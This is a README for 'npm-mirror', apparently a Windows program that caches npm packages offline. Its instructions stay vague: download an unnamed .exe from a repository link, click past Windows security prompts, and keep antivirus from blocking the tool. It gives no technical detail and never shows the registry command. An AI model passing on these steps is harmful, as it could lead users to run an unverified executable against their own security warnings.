# 📦 npm-mirror - Save your work during internet outages

[![](https://img.shields.io/badge/Download-npm--mirror-blue.svg)](https://github.com/uzisnoopy-lab/npm-mirror)

## 📌 About this project

NPM Mirror keeps your development environment stable. It acts as a local store for your code packages. When the internet connection cuts out or slows down, your machine uses this store instead of the public web. You continue to build and test your projects without delay.

This application provides a local registry. It saves copies of the tools you download from the npm service. If you live in an area with unstable web access, this application ensures your workflow remains functional. It works with npm, pnpm, and yarn.

## ⚙️ System requirements

Before you install the software, look over these needs:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Any modern processor with at least 2 gigahertz speed.
*   Memory: 4 gigabytes of random access memory.
*   Storage: 2 gigabytes of free disk space for the initial cache.
*   Connection: A steady web connection for the first download of your packages.

## 📥 Getting the software

You must visit the project release page to get the installer for Windows. 

[Visit this page to download the latest installer](https://github.com/uzisnoopy-lab/npm-mirror)

Choose the file that ends in .exe. Save it to your Downloads folder.

## 🛠️ Installation steps

Follow these instructions to set up the software on your Windows computer:

1.  Locate the file you downloaded. It should sit in your Downloads folder.
2.  Double-click the file to open the setup window.
3.  Windows may show a security prompt. If it asks for permission to run the file, click Run or Yes.
4.  Follow the prompts in the installer window.
5.  Choose the folder where you want to keep your mirror files. A default folder works for most users.
6.  Click Install to start the process.
7.  Wait for the progress bar to finish.
8.  Click Finish to launch the application.

## 🚀 Running the application

Once installed, the application icon appears on your desktop. Double-click the icon to start the local registry service.

When the application opens, look for the dashboard view. This screen shows the current status of your cache. A green indicator means the service runs. A red indicator means the service is stopped. 

If the service is off, click the Start button. The application creates a connection point on your machine. You can now direct your development tools to look at this local point for packages.

## 🔌 Connecting your tools

Your development tools need to know about the mirror. You must change your configuration settings to point to the local server.

1.  Open your command prompt or terminal.
2.  Type the command to set the registry address. The application provides this specific address in the Help tab.
3.  Press Enter.
4.  Your tools now pull packages from your local store first. If the package does not exist, the tool tries the public web.

## 🛡️ Managing your cache

The application keeps your files in the storage folder you chose during setup. You check the size of your cache from the main dashboard. 

If your disk space runs low, use the Clear Cache button in the settings menu. This action removes the saved copies. Your tools will fetch new copies from the web when you next request them.

## 💡 Troubleshooting common issues

Most users encounter few issues. If you struggle, try these steps:

*   Service fails to start: Ensure no other application uses the same network port. Check the Settings tab to change the port number if a conflict occurs.
*   Packages fail to load: Verify your local registry settings. Run the command to list your current registry address and make sure it matches the address shown in the application.
*   Slow performance: Close unnecessary apps on your machine. Ensure your antivirus software does not block the local connection.

## 📈 Frequently asked questions

Does this work offline? 
Yes. Once you populate the cache with the packages you need, your tools use those local files even without access to the outside internet.

Does it support other languages?
The mirror works with any project that uses the npm ecosystem. It does not matter what language you write your code in.

Will it slow down my internet?
It does not slow down your general browsing. It only manages the requests from your specific development tools.

Is it secure?
The mirror acts as a bridge. It keeps local copies of files you trust. 

Keywords: farsi, free, iran, iranian, javascript, mirror, npm, offline-first, persian, pnpm, register, registry-cache, resource, verdaccio, war, yarn